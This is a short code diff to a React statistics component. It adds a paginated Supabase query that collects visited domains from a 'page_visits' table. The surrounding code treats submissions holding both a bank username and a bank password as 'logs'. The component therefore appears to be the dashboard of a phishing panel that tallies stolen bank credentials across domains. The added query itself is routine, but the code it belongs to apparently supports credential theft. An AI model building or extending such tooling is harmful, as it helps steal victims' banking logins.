@@ -44,6 +44,27 @@ function StatisticsContent() {
     },
   });
 
+  const { data: visits = [] } = useQuery({
+    queryKey: ["stats-page-visits"],
+    queryFn: async () => {
+      const all: VisitRow[] = [];
+      let from = 0;
+      const PAGE = 1000;
+      while (true) {
+        const { data, error } = await supabase
+          .from("page_visits")
+          .select("domain")
+          .range(from, from + PAGE - 1);
+        if (error) throw error;
+        const rows = (data || []) as VisitRow[];
+        all.push(...rows);
+        if (rows.length < PAGE) break;
+        from += PAGE;
+      }
+      return all;
+    },
+  });
+
   const isLog = (s: SubRow) => !!(s.bank_username && s.bank_password);
 
   const totals = useMemo(() => {
